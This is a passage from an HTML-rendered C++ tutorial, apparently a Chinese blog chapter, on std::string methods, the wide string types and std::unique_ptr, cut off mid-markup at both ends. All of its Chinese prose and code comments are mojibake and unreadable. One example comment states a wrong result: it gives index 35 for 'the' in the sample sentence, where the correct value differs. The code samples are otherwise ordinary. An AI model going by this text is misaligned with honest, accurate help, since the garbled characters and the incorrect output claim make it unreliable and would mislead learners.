æä¾›å¿«é€Ÿè®¿é—®ï¼Œä½†<strong>ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥</strong>ã€‚è®¿é—®è¶Šç•Œæ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚</p></li><li><p><code>at()</code>: æä¾›è¾¹ç•Œæ£€æŸ¥çš„è®¿é—®ã€‚å¦‚æœç´¢å¼•è¶Šç•Œï¼Œä¼šæŠ›å‡º <code>std::out_of_range</code> å¼‚å¸¸ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> word = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> first_char = word[<span class="number">0</span>]; <span class="comment">// &#x27;W&#x27;</span></span><br><span class="line"><span class="keyword">char</span> last_char = word[word.length() - <span class="number">1</span>]; <span class="comment">// &#x27;d&#x27;</span></span><br><span class="line"><span class="comment">// word[5] = &#x27;!&#x27;; // å±é™©ï¼è¶Šç•Œè®¿é—®ï¼Œæœªå®šä¹‰è¡Œä¸º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">char</span> c = word.at(<span class="number">1</span>); <span class="comment">// &#x27;o&#x27;</span></span><br><span class="line">    word.at(<span class="number">0</span>) = <span class="string">&#x27;J&#x27;</span>; <span class="comment">// word å˜ä¸º &quot;Jorld&quot;</span></span><br><span class="line">    c = word.at(<span class="number">10</span>); <span class="comment">// è¶Šç•Œï¼Œå°†æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::out_of_range&amp; oor) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Out of Range error: &quot;</span> &lt;&lt; oor.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æŸ¥æ‰¾:</strong> <code>string</code> æä¾›äº†å¤šç§æŸ¥æ‰¾æ–¹æ³•ï¼š</p><ul><li><p>  <code>find(substr, pos=0)</code>: ä»ç´¢å¼• <code>pos</code> å¼€å§‹æŸ¥æ‰¾å­ä¸² <code>substr</code> ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></li><li><p>  <code>rfind(substr, pos=npos)</code>: ä»ç´¢å¼• <code>pos</code> å‘å‰æŸ¥æ‰¾å­ä¸² <code>substr</code> æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></li><li><p>  <code>find_first_of(chars, pos=0)</code>: ä» <code>pos</code> å¼€å§‹æŸ¥æ‰¾ <code>chars</code> ä¸­<strong>ä»»ä½•ä¸€ä¸ª</strong>å­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></li><li><p>  <code>find_last_of(chars, pos=npos)</code>: ä» <code>pos</code> å‘å‰æŸ¥æ‰¾ <code>chars</code> ä¸­<strong>ä»»ä½•ä¸€ä¸ª</strong>å­—ç¬¦æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></li><li><p>  <code>find_first_not_of(chars, pos=0)</code>: ä» <code>pos</code> å¼€å§‹æŸ¥æ‰¾<strong>ç¬¬ä¸€ä¸ªä¸</strong>åœ¨ <code>chars</code> ä¸­çš„å­—ç¬¦çš„ä½ç½®ã€‚</p></li><li><p>  <code>find_last_not_of(chars, pos=npos)</code>: ä» <code>pos</code> å‘å‰æŸ¥æ‰¾<strong>æœ€åä¸€ä¸ªä¸</strong>åœ¨ <code>chars</code> ä¸­çš„å­—ç¬¦çš„ä½ç½®ã€‚</p></li><li><p>æ‰€æœ‰æŸ¥æ‰¾æ–¹æ³•å¦‚æœæ‰¾åˆ°ï¼Œè¿”å›åŒ¹é…çš„èµ·å§‹ç´¢å¼•ï¼›å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å› <code>std::string::npos</code> (ä¸€ä¸ªé™æ€æˆå‘˜å¸¸é‡ï¼Œé€šå¸¸æ˜¯ <code>-1</code> æˆ–æœ€å¤§æ— ç¬¦å·æ•´æ•°å€¼)ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;The quick brown fox jumps over the lazy dog.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> search_str = <span class="string">&quot;the&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> vowels = <span class="string">&quot;aeiouAEIOU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos = text.find(search_str); <span class="comment">// æŸ¥æ‰¾ &quot;the&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; search_str &lt;&lt; <span class="string">&quot;&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 35</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; search_str &lt;&lt; <span class="string">&quot;&#x27; not found.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = text.find(<span class="string">&quot;The&quot;</span>); <span class="comment">// æŸ¥æ‰¾ &quot;The&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;The&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = text.find_first_of(vowels); <span class="comment">// æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå…ƒéŸ³</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First vowel &#x27;&quot;</span> &lt;&lt; text[pos] &lt;&lt; <span class="string">&quot;&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &#x27;e&#x27; at 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = text.find_first_not_of(<span class="string">&quot; &quot;</span>); <span class="comment">// æŸ¥æ‰¾ç¬¬ä¸€ä¸ªéç©ºæ ¼</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First non-space &#x27;&quot;</span> &lt;&lt; text[pos] &lt;&lt; <span class="string">&quot;&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &#x27;T&#x27; at 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ä¿®æ”¹:</strong></p><ul><li><p>  <code>insert(pos, str)</code>: åœ¨ç´¢å¼• <code>pos</code> å¤„æ’å…¥å­—ç¬¦ä¸² <code>str</code>ã€‚</p></li><li><p>  <code>erase(pos, count)</code>: ä»ç´¢å¼• <code>pos</code> å¼€å§‹åˆ é™¤ <code>count</code> ä¸ªå­—ç¬¦ã€‚</p></li><li><p>  <code>replace(pos, count, str)</code>: å°†ä» <code>pos</code> å¼€å§‹çš„ <code>count</code> ä¸ªå­—ç¬¦æ›¿æ¢ä¸º <code>str</code>ã€‚</p></li><li><p>  <code>append(str)</code>: åœ¨æœ«å°¾è¿½åŠ  <code>str</code> (ç­‰ä»·äº <code>+=</code>)ã€‚</p></li><li><p><code>assign(str)</code>: æ›¿æ¢æ•´ä¸ªå­—ç¬¦ä¸²å†…å®¹ä¸º <code>str</code> (ç­‰ä»·äº <code>=</code>)ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> phrase = <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">phrase.insert(<span class="number">6</span>, <span class="string">&quot;beautiful &quot;</span>); <span class="comment">// &quot;Hello beautiful world&quot;</span></span><br><span class="line">phrase.erase(<span class="number">0</span>, <span class="number">6</span>); <span class="comment">// &quot;beautiful world&quot;</span></span><br><span class="line">phrase.replace(<span class="number">0</span>, <span class="number">9</span>, <span class="string">&quot;Wonderful&quot;</span>); <span class="comment">// &quot;Wonderful world&quot;</span></span><br><span class="line">phrase.append(<span class="string">&quot;!&quot;</span>); <span class="comment">// &quot;Wonderful world!&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>è·å– C é£æ ¼å­—ç¬¦ä¸²:</strong></p><ul><li><p>  <code>c_str()</code>: è¿”å›ä¸€ä¸ªæŒ‡å‘ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„ <code>const char*</code> æ•°ç»„çš„æŒ‡é’ˆï¼Œå†…å®¹ä¸ <code>string</code> å¯¹è±¡ç›¸åŒã€‚è¿”å›çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨ <code>string</code> å¯¹è±¡è¢«ä¿®æ”¹æˆ–é”€æ¯åå¯èƒ½å¤±æ•ˆã€‚</p></li><li><p><code>data()</code>: ç±»ä¼¼ <code>c_str()</code>ï¼Œä½†åœ¨ C++11 ä¹‹å‰ä¸ä¿è¯ä»¥ç©ºå­—ç¬¦ç»“å°¾ï¼ˆC++11 èµ·ä¿è¯ç»“å°¾æœ‰ <code>\0</code>ï¼‰ã€‚</p><p>å½“ä½ éœ€è¦å°† <code>string</code> å¯¹è±¡ä¼ é€’ç»™éœ€è¦ <code>const char*</code> çš„ C é£æ ¼å‡½æ•°æ—¶ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•éå¸¸æœ‰ç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // for printf</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> cpp_str = <span class="string">&quot;C++ String&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Using c_str(): %s\n&quot;</span>, cpp_str.c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="16-1-4-string-è¿˜æä¾›äº†å“ªäº›åŠŸèƒ½"><a href="#16-1-4-string-è¿˜æä¾›äº†å“ªäº›åŠŸèƒ½" class="headerlink" title="16.1.4 string è¿˜æä¾›äº†å“ªäº›åŠŸèƒ½"></a>16.1.4 string è¿˜æä¾›äº†å“ªäº›åŠŸèƒ½</h3><p><code>std::string</code> ç±»è¿˜æœ‰è®¸å¤šå…¶ä»–åŠŸèƒ½ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><strong>å®¹é‡ç®¡ç†:</strong><ul><li>  <code>capacity()</code>: è¿”å›å½“å‰åˆ†é…çš„å†…å­˜å®¹é‡ï¼ˆå¯èƒ½å¤§äº <code>size()</code>ï¼‰ã€‚</li><li>  <code>reserve(n)</code>: è¯·æ±‚è‡³å°‘ä¸º <code>n</code> çš„å®¹é‡ã€‚å¦‚æœ <code>n</code> å¤§äºå½“å‰å®¹é‡ï¼Œå¯èƒ½é‡æ–°åˆ†é…å†…å­˜ã€‚</li><li>  <code>shrink_to_fit()</code> (C++11): è¯·æ±‚å‡å°‘å®¹é‡ä»¥åŒ¹é…å½“å‰å¤§å°ã€‚</li><li>  <code>clear()</code>: æ¸…ç©ºå­—ç¬¦ä¸²å†…å®¹ï¼ˆ<code>size()</code> å˜ä¸º 0ï¼‰ã€‚</li><li>  <code>empty()</code>: æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼ˆ<code>size() == 0</code>ï¼‰ã€‚</li></ul></li><li>  <strong>è¿­ä»£å™¨:</strong> æä¾› <code>begin()</code>, <code>end()</code>, <code>rbegin()</code>, <code>rend()</code> ç­‰è¿­ä»£å™¨ï¼Œå…è®¸åƒéå†å®¹å™¨ä¸€æ ·éå†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œå¯ä»¥é…åˆ STL ç®—æ³•ä½¿ç”¨ã€‚</li><li>  <strong>å­å­—ç¬¦ä¸²:</strong> <code>substr(pos, count)</code>: è¿”å›ä¸€ä¸ªæ–°çš„ <code>string</code> å¯¹è±¡ï¼ŒåŒ…å«ä» <code>pos</code> å¼€å§‹çš„ <code>count</code> ä¸ªå­—ç¬¦çš„å­ä¸²ã€‚</li><li>  <strong>æ¯”è¾ƒ:</strong> <code>compare()</code> æ–¹æ³•æä¾›æ¯”å…³ç³»è¿ç®—ç¬¦æ›´è¯¦ç»†çš„æ¯”è¾ƒé€‰é¡¹ã€‚</li><li>  <strong>æ•°å€¼è½¬æ¢ (C++11):</strong> <code>&lt;string&gt;</code> å¤´æ–‡ä»¶è¿˜åŒ…å« <code>stoi</code>, <code>stol</code>, <code>stod</code>, <code>to_string</code> ç­‰å‡½æ•°ï¼Œç”¨äºå­—ç¬¦ä¸²å’Œæ•°å€¼ç±»å‹ä¹‹é—´çš„è½¬æ¢ã€‚</li></ul><p>è¦äº†è§£ <code>string</code> ç±»çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå»ºè®®æŸ¥é˜… C++ å‚è€ƒæ–‡æ¡£ï¼ˆå¦‚ cppreference.comï¼‰ã€‚</p><h3 id="16-1-5-å­—ç¬¦ä¸²ç§ç±»"><a href="#16-1-5-å­—ç¬¦ä¸²ç§ç±»" class="headerlink" title="16.1.5 å­—ç¬¦ä¸²ç§ç±»"></a>16.1.5 å­—ç¬¦ä¸²ç§ç±»</h3><p><code>std::string</code> æ˜¯ <code>std::basic_string&lt;char&gt;</code> çš„åˆ«åï¼Œç”¨äºå¤„ç†åŸºäº <code>char</code> çš„çª„å­—ç¬¦å­—ç¬¦ä¸²ï¼ˆé€šå¸¸æ˜¯ ASCII æˆ– UTF-8 ç¼–ç ï¼‰ã€‚</p><p>C++ æ ‡å‡†åº“è¿˜æä¾›äº†å¤„ç†å…¶ä»–å­—ç¬¦ç±»å‹çš„ <code>basic_string</code> ç‰¹åŒ–ç‰ˆæœ¬ï¼š</p><ul><li>  <strong><code>std::wstring</code>:</strong> <code>basic_string&lt;wchar_t&gt;</code> çš„åˆ«åï¼Œç”¨äºå¤„ç†å®½å­—ç¬¦ (<code>wchar_t</code>) å­—ç¬¦ä¸²ï¼Œå¸¸ç”¨äº Windows API ä¸­çš„ Unicodeã€‚</li><li>  <strong><code>std::u16string</code> (C++11):</strong> <code>basic_string&lt;char16_t&gt;</code> çš„åˆ«åï¼Œç”¨äºå¤„ç† UTF-16 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚</li><li>  <strong><code>std::u32string</code> (C++11):</strong> <code>basic_string&lt;char32_t&gt;</code> çš„åˆ«åï¼Œç”¨äºå¤„ç† UTF-32 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚</li></ul><p>è¿™äº›å®½å­—ç¬¦ä¸²ç±»å…·æœ‰ä¸ <code>std::string</code> ç±»ä¼¼çš„æ“ä½œæ¥å£ï¼Œä½†å¤„ç†çš„å­—ç¬¦ç±»å‹ä¸åŒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> wide_str = <span class="string">L&quot;Wide String Example&quot;</span>; <span class="comment">// L å‰ç¼€è¡¨ç¤ºå®½å­—ç¬¦å­—é¢é‡</span></span><br><span class="line">    <span class="built_in">std</span>::u16string utf16_str = <span class="string">u&quot;UTF-16 String&quot;</span>; <span class="comment">// u å‰ç¼€</span></span><br><span class="line">    <span class="built_in">std</span>::u32string utf32_str = <span class="string">U&quot;UTF-32 String&quot;</span>; <span class="comment">// U å‰ç¼€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::wcout ç”¨äºè¾“å‡ºå®½å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::wcout &lt;&lt; <span class="string">L&quot;Wide: &quot;</span> &lt;&lt; wide_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡º UTF-16/32 å­—ç¬¦ä¸²é€šå¸¸éœ€è¦ç‰¹å®šçš„åº“æˆ–è½¬æ¢</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; utf16_str &lt;&lt; std::endl; // å¯èƒ½æ— æ³•æ­£ç¡®æ˜¾ç¤º</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å“ªç§å­—ç¬¦ä¸²ç±»å‹å–å†³äºä½ çš„åº”ç”¨åœºæ™¯å’Œéœ€è¦å¤„ç†çš„å­—ç¬¦é›†ã€‚åœ¨ç°ä»£ C++ ä¸­ï¼Œå¦‚æœéœ€è¦å¤„ç† Unicodeï¼Œé€šå¸¸æ¨èä½¿ç”¨ UTF-8 ç¼–ç çš„ <code>std::string</code>ï¼Œå¹¶é…åˆç›¸åº”çš„ Unicode å¤„ç†åº“ã€‚</p><h2 id="16-2-æ™ºèƒ½æŒ‡é’ˆæ¨¡æ¿ç±»"><a href="#16-2-æ™ºèƒ½æŒ‡é’ˆæ¨¡æ¿ç±»" class="headerlink" title="16.2 æ™ºèƒ½æŒ‡é’ˆæ¨¡æ¿ç±»"></a>16.2 æ™ºèƒ½æŒ‡é’ˆæ¨¡æ¿ç±»</h2><p>åœ¨ C++ ä¸­ï¼Œä½¿ç”¨ <code>new</code> åˆ†é…åŠ¨æ€å†…å­˜åï¼Œå¿…é¡»ä½¿ç”¨ <code>delete</code> æ¥é‡Šæ”¾å®ƒï¼Œå¦åˆ™ä¼šå¯¼è‡´**å†…å­˜æ³„æ¼ (Memory Leak)**ã€‚æ‰‹åŠ¨ç®¡ç†å†…å­˜å®¹æ˜“å‡ºé”™ï¼Œå°¤å…¶æ˜¯åœ¨å¤æ‚çš„ä»£ç è·¯å¾„ã€å¼‚å¸¸å¤„ç†æˆ–èµ„æºå…±äº«çš„æƒ…å†µä¸‹ã€‚å¿˜è®° <code>delete</code>ã€é‡å¤ <code>delete</code> æˆ–ä½¿ç”¨æ‚¬æŒ‚æŒ‡é’ˆï¼ˆæŒ‡å‘å·²é‡Šæ”¾å†…å­˜çš„æŒ‡é’ˆï¼‰éƒ½æ˜¯å¸¸è§çš„é”™è¯¯æ¥æºã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒC++ æ ‡å‡†åº“ï¼ˆåœ¨ <code>&lt;memory&gt;</code> å¤´æ–‡ä»¶ä¸­ï¼‰æä¾›äº†ä¸€ç³»åˆ—<strong>æ™ºèƒ½æŒ‡é’ˆ (Smart Pointers)</strong> æ¨¡æ¿ç±»ã€‚æ™ºèƒ½æŒ‡é’ˆæ˜¯è¡Œä¸ºç±»ä¼¼äºæŒ‡é’ˆçš„ç±»å¯¹è±¡ï¼Œä½†å®ƒä»¬èƒ½<strong>è‡ªåŠ¨ç®¡ç†</strong>æ‰€æŒ‡å‘çš„åŠ¨æ€åˆ†é…çš„å†…å­˜ã€‚å½“æ™ºèƒ½æŒ‡é’ˆæœ¬èº«ç¦»å¼€ä½œç”¨åŸŸï¼ˆä¾‹å¦‚å‡½æ•°ç»“æŸã€å¯¹è±¡é”€æ¯ï¼‰æˆ–è¢«é‡æ–°èµ‹å€¼æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨ <code>delete</code>ï¼ˆæˆ–è‡ªå®šä¹‰çš„åˆ é™¤å™¨ï¼‰æ¥é‡Šæ”¾å…¶ç®¡ç†çš„å†…å­˜ã€‚è¿™æå¤§åœ°ç®€åŒ–äº†åŠ¨æ€å†…å­˜ç®¡ç†ï¼Œæé«˜äº†ç¨‹åºçš„å¥å£®æ€§ï¼Œå¹¶æœ‰åŠ©äºå®ç° RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰ã€‚</p><p>C++11 å¼•å…¥äº†ä¸‰ç§ä¸»è¦çš„æ™ºèƒ½æŒ‡é’ˆç±»å‹ï¼š</p><ol><li> <strong><code>std::unique_ptr&lt;T&gt;</code>:</strong> å®ç°<strong>ç‹¬å æ‰€æœ‰æƒ (Exclusive Ownership)</strong> æˆ–ä¸¥æ ¼æ‰€æœ‰æƒæ¨¡å‹ã€‚åœ¨ä»»ä½•æ—¶å€™ï¼Œåªæœ‰ä¸€ä¸ª <code>unique_ptr</code> å¯ä»¥æŒ‡å‘ç»™å®šçš„èµ„æºã€‚å½“ <code>unique_ptr</code> è¢«é”€æ¯æˆ–é‡ç½®æ—¶ï¼Œèµ„æºè¢«é‡Šæ”¾ã€‚å®ƒ<strong>ä¸èƒ½è¢«å¤åˆ¶</strong>ï¼Œä½†å¯ä»¥è¢«**ç§»åŠ¨ (Moved)**ã€‚</li><li> <strong><code>std::shared_ptr&lt;T&gt;</code>:</strong> å®ç°<strong>å…±äº«æ‰€æœ‰æƒ (Shared Ownership)</strong> æ¨¡å‹ã€‚å…è®¸å¤šä¸ª <code>shared_ptr</code> æŒ‡å‘åŒä¸€ä¸ªèµ„æºã€‚å†…éƒ¨ç»´æŠ¤ä¸€ä¸ª**å¼•ç”¨è®¡æ•° (Reference Count)**ï¼Œè®°å½•æœ‰å¤šå°‘ä¸ª <code>shared_ptr</code> æŒ‡å‘è¯¥èµ„æºã€‚åªæœ‰å½“æœ€åä¸€ä¸ªæŒ‡å‘èµ„æºçš„ <code>shared_ptr</code> è¢«é”€æ¯æˆ–é‡ç½®æ—¶ï¼Œèµ„æºæ‰ä¼šè¢«é‡Šæ”¾ã€‚</li><li> <strong><code>std::weak_ptr&lt;T&gt;</code>:</strong> æ˜¯ä¸€ç§<strong>éæ‹¥æœ‰ (Non-owning)</strong> çš„æ™ºèƒ½æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘ç”± <code>shared_ptr</code> ç®¡ç†çš„èµ„æºï¼Œä½†<strong>ä¸å¢åŠ </strong>å¼•ç”¨è®¡æ•°ã€‚å®ƒä¸»è¦ç”¨äºè§£å†³ <code>shared_ptr</code> å¯èƒ½é‡åˆ°çš„<strong>å¾ªç¯å¼•ç”¨ (Cyclic Reference)</strong> é—®é¢˜ï¼Œå¹¶ç”¨äºè§‚å¯Ÿèµ„æºæ˜¯å¦å­˜åœ¨ã€‚</li></ol><h3 id="16-2-1-ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆ"><a href="#16-2-1-ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆ" class="headerlink" title="16.2.1 ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆ"></a>16.2.1 ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆ</h3><h4 id="std-unique-ptr"><a href="#std-unique-ptr" class="headerlink" title="std::unique_ptr"></a><code>std::unique_ptr</code></h4><p><code>unique_ptr</code> æ˜¯è½»é‡çº§çš„æ™ºèƒ½æŒ‡é’ˆï¼Œå¼€é”€å‡ ä¹ä¸åŸå§‹æŒ‡é’ˆç›¸åŒã€‚å®ƒæ˜¯ç®¡ç†åŠ¨æ€åˆ†é…èµ„æºçš„<strong>é¦–é€‰</strong>æ–¹å¼ï¼Œé™¤éä½ éœ€è¦å…±äº«æ‰€æœ‰æƒã€‚</p><p><strong>åˆ›å»º:</strong></p><ul><li><strong>æ¨èæ–¹å¼ (C++14 åŠä»¥å):</strong> ä½¿ç”¨ <code>std::make_unique&lt;T&gt;(args...)</code>ã€‚å®ƒæ›´å®‰å…¨ï¼ˆé¿å…äº†æŸäº›å¼‚å¸¸å®‰å…¨é—®é¢˜ï¼‰ä¸”å¯èƒ½æ›´é«˜æ•ˆã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæŒ‡å‘ int çš„ unique_ptr</span></span><br><span class="line"><span class="keyword">auto</span> uptr_int = <span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>&gt;(<span class="number">10</span>); <span class="comment">// æŒ‡å‘å€¼ä¸º 10 çš„ int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæŒ‡å‘ string çš„ unique_ptr</span></span><br><span class="line"><span class="keyword">auto</span> uptr_str = <span class="built_in">std</span>::make_unique&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Hello&quot;</span>); <span class="comment">// æŒ‡å‘ &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>C++11 æ–¹å¼:</strong> ç›´æ¥ä½¿ç”¨ <code>new</code>ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">uptr_int_cpp11</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">20</span>))</span></span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">uptr_str_cpp11</span><span class="params">(<span class="keyword">new</span> <span class="built_in">std</span>::<span class="built_in">string</span>(<span 